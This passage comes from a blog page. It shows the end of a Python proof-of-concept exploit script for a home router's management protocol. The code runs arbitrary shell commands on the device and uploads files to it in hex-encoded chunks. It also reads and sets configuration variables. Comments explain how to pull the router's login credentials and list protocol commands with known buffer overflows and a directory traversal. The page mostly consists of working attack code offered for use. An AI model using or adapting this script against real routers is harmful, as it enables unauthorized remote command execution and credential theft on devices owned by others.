        </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">{}</span><span style="color:#a3be8c;">:</span><span style="color:#d08770;">{}</span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#bf616a;">format</span><span style="color:#c0c5ce;">(var, value))</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">elif </span><span style="color:#c0c5ce;">args.send_file:</span><span style="color:#c0c5ce;">
    </span><span style="color:#b48ead;">with </span><span style="color:#96b5b4;">open</span><span style="color:#c0c5ce;">(args.send_file, &quot;</span><span style="color:#a3be8c;">r</span><span style="color:#c0c5ce;">&quot;) </span><span style="color:#b48ead;">as </span><span style="color:#c0c5ce;">f:</span><span style="color:#c0c5ce;">
        buf = f.</span><span style="color:#bf616a;">read</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
        msg = args.remote_filename + &quot;</span><span style="color:#96b5b4;">\0</span><span style="color:#c0c5ce;">&quot; + buf</span><span style="color:#c0c5ce;">
        </span><span style="color:#bf616a;">send_message</span><span style="color:#c0c5ce;">(s, endianness, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, msg);</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">elif </span><span style="color:#c0c5ce;">args.send_file2:</span><span style="color:#c0c5ce;">
    </span><span style="color:#bf616a;">CHUNK </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">1024</span><span style="color:#c0c5ce;">
    fdst = &quot;</span><span style="color:#a3be8c;">/tmp/</span><span style="color:#c0c5ce;">&quot; + args.remote_filename</span><span style="color:#c0c5ce;">
    </span><span style="color:#bf616a;">send_message</span><span style="color:#c0c5ce;">(s, endianness, </span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">rm </span><span style="color:#c0c5ce;">&quot; + fdst)</span><span style="color:#c0c5ce;">
    </span><span style="color:#b48ead;">with </span><span style="color:#96b5b4;">open</span><span style="color:#c0c5ce;">(args.send_file2, &quot;</span><span style="color:#a3be8c;">rb</span><span style="color:#c0c5ce;">&quot;) </span><span style="color:#b48ead;">as </span><span style="color:#c0c5ce;">f:</span><span style="color:#c0c5ce;">
        </span><span style="color:#b48ead;">while </span><span style="color:#d08770;">True</span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
            buf = f.</span><span style="color:#bf616a;">read</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">CHUNK</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
            </span><span style="color:#b48ead;">if </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(buf) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
                </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">
            cmd = &#39;</span><span style="color:#a3be8c;">echo -n -e &quot;</span><span style="color:#c0c5ce;">&#39; + &#39;&#39;.</span><span style="color:#bf616a;">join</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">map</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">c</span><span style="color:#c0c5ce;">: &quot;</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">x</span><span style="color:#d08770;">{:02x}</span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#bf616a;">format</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">ord</span><span style="color:#c0c5ce;">(c)), buf))+&#39;</span><span style="color:#a3be8c;">&quot;</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#c0c5ce;">
            cmd += &#39;</span><span style="color:#a3be8c;"> &gt;&gt;</span><span style="color:#c0c5ce;">&#39; + fdst</span><span style="color:#c0c5ce;">
            </span><span style="color:#b48ead;">try</span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
                </span><span style="color:#bf616a;">send_message</span><span style="color:#c0c5ce;">(s, endianness, </span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, cmd)</span><span style="color:#c0c5ce;">
            </span><span style="color:#b48ead;">except </span><span style="color:#c0c5ce;">socket.timeout:</span><span style="color:#c0c5ce;">
                </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Timeout, reconnect...</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
                s.</span><span style="color:#bf616a;">close</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
                s = socket.</span><span style="color:#bf616a;">socket</span><span style="color:#c0c5ce;">(socket.</span><span style="color:#bf616a;">AF_INET</span><span style="color:#c0c5ce;">, socket.</span><span style="color:#bf616a;">SOCK_STREAM</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
                s.</span><span style="color:#bf616a;">settimeout</span><span style="color:#c0c5ce;">(args.timeout)</span><span style="color:#c0c5ce;">
                s.</span><span style="color:#bf616a;">connect</span><span style="color:#c0c5ce;">((args.ip, args.port))</span><span style="color:#c0c5ce;">
                </span><span style="color:#65737e;"># Get current size</span><span style="color:#65737e;">
                </span><span style="color:#c0c5ce;">ls = </span><span style="color:#bf616a;">send_message</span><span style="color:#c0c5ce;">(s, endianness, </span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">ls -l </span><span style="color:#c0c5ce;">&quot; + fdst)</span><span style="color:#c0c5ce;">
                size = </span><span style="color:#bf616a;">int</span><span style="color:#c0c5ce;">(re.</span><span style="color:#bf616a;">split</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">[ </span><span style="color:#96b5b4;">\t</span><span style="color:#a3be8c;">]+</span><span style="color:#c0c5ce;">&#39;, ls)[</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">])</span><span style="color:#c0c5ce;">
                </span><span style="color:#65737e;"># Let&#39;s start from here</span><span style="color:#65737e;">
                </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Seek from </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">...</span><span style="color:#c0c5ce;">&quot; % size)</span><span style="color:#c0c5ce;">
                f.</span><span style="color:#bf616a;">seek</span><span style="color:#c0c5ce;">(size)</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">elif </span><span style="color:#c0c5ce;">args.get_var is not </span><span style="color:#d08770;">None </span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
    response = </span><span style="color:#bf616a;">send_message</span><span style="color:#c0c5ce;">(s, endianness, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, args.get_var)[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">].</span><span style="color:#bf616a;">rstrip</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
    </span><span style="color:#b48ead;">if </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(response) == </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
        </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">{0:s}</span><span style="color:#a3be8c;"> is not set</span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#bf616a;">format</span><span style="color:#c0c5ce;">(args.get_var))</span><span style="color:#c0c5ce;">
    </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
        </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(response)</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">elif </span><span style="color:#c0c5ce;">args.set_var is not </span><span style="color:#d08770;">None </span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
    r, </span><span style="color:#bf616a;">_ </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">send_message</span><span style="color:#c0c5ce;">(s, endianness, </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">, args.set_var)</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">elif </span><span style="color:#c0c5ce;">args.message is not </span><span style="color:#d08770;">None </span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
    r, response = </span><span style="color:#bf616a;">send_message</span><span style="color:#c0c5ce;">(s, endianness, args.message, args.payload)</span><span style="color:#c0c5ce;">
    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">r != </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
        </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Command failed, error code: </span><span style="color:#d08770;">{0:08X}</span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#bf616a;">format</span><span style="color:#c0c5ce;">(r))</span><span style="color:#c0c5ce;">
    </span><span style="color:#b48ead;">elif </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(response) != </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
        </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Command succeed:</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
        </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(response.</span><span style="color:#bf616a;">encode</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">string_escape</span><span style="color:#c0c5ce;">&quot;))</span><span style="color:#c0c5ce;">
    </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
        </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Command succeed:</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">{0:s}</span><span style="color:#a3be8c;">:</span><span style="color:#d08770;">{1:d}</span><span style="color:#a3be8c;"> is vulnerable!</span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#bf616a;">format</span><span style="color:#c0c5ce;">(args.ip, args.port))</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
s.</span><span style="color:#bf616a;">close</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;"># Gives the login/pass of your router. Works for Linux for sure.</span><span style="color:#65737e;">
# python poc.py --get_credentials --ip $(ip route|grep -Eo &#39;default via ([0-9.]+)&#39;|sed &#39;s/default via //&#39;)</span><span style="color:#65737e;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">#commands :</span><span style="color:#65737e;">
# 1 : get infos</span><span style="color:#65737e;">
# 2 : get var -&gt; possible overflow</span><span style="color:#65737e;">
# 3 : set var -&gt; buffer overflow</span><span style="color:#65737e;">
# 4 : commit nvram (read nvram /dev/mtdblock/3 from /tmp/nvram and check CRC)</span><span style="color:#65737e;">
# 5 : bridge mode ?</span><span style="color:#65737e;">
#   wan_mode=bridgedonly</span><span style="color:#65737e;">
#   wan_encap=0</span><span style="color:#65737e;">
#   wan_vpi=8</span><span style="color:#65737e;">
#   wan_vci=81</span><span style="color:#65737e;">
#   /usr/bin/killall br2684ctl</span><span style="color:#65737e;">
#   /usr/bin/killall udhcpd</span><span style="color:#65737e;">
#   /usr/bin/killall -9 atm_monitor</span><span style="color:#65737e;">
#   /usr/sbin/rc wan stop &gt;/dev/null 2&gt;&amp;1</span><span style="color:#65737e;">
#   /usr/sbin/atm_monitor&amp;</span><span style="color:#65737e;">
# 6 : show speed</span><span style="color:#65737e;">
# 7 : cmd</span><span style="color:#65737e;">
#   special commands :</span><span style="color:#65737e;">
#       exit, bye, quit -&gt; quit... (set alive to 0)</span><span style="color:#65737e;">
#       cd : change directory (a little bit WTF)</span><span style="color:#65737e;">
# other commands :</span><span style="color:#65737e;">
#       integer overflow in stdout handling (?) not exploitable but still ...</span><span style="color:#65737e;">
#       buffer overflow (buffer de 0x10000)</span><span style="color:#65737e;">
#</span><span style="color:#65737e;">
# 8 : write file (file name in payload, dir : tmp, directory traversa)</span><span style="color:#65737e;">
# 9 : print version</span><span style="color:#65737e;">
#10 : print modem router ip (nvram_get(lan_ipaddr))</span><span style="color:#65737e;">
#11 : resaure default settings (nvram_set(restore_default, 1) / nvram_commit)</span><span style="color:#65737e;">
#12 : read /dev/mtdblock/0 [-4:-2]</span><span style="color:#65737e;">
#13 : dump nvram on disk (/tmp/nvram) and commit</span><span style="color:#65737e;">
</span></code></pre>
    </div>

    
    

    <div class="post-footer">
        
            
                <div class="post-tags">
                    
                        <!-- <a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all&#x2F;">#all</a> -->
                    
                </div>
            
            
                <div class="post-nav">
                    
                        <a class="previous" href="https:&#x2F;&#x2F;xjump.me&#x2F;local-exploit-cve2010-3848-3850&#x2F;">‹ CVE-2010-3848 &amp; CVE-2010-3850</a>
                    
                    
                        <a class="next" href="https:&#x2F;&#x2F;xjump.me&#x2F;reverse-tcp-shell&#x2F;">简单的反弹shell ›</a>
                    
                    
                    
                </div>
            

        

    </div>

    
    
</article>


                </div>
            </main>

            
            
        </div>

      
          <script type="text/javascript" src="https:&#x2F;&#x2F;xjump.me&#x2F;even.js" ></script>
      
    </body>

</html>
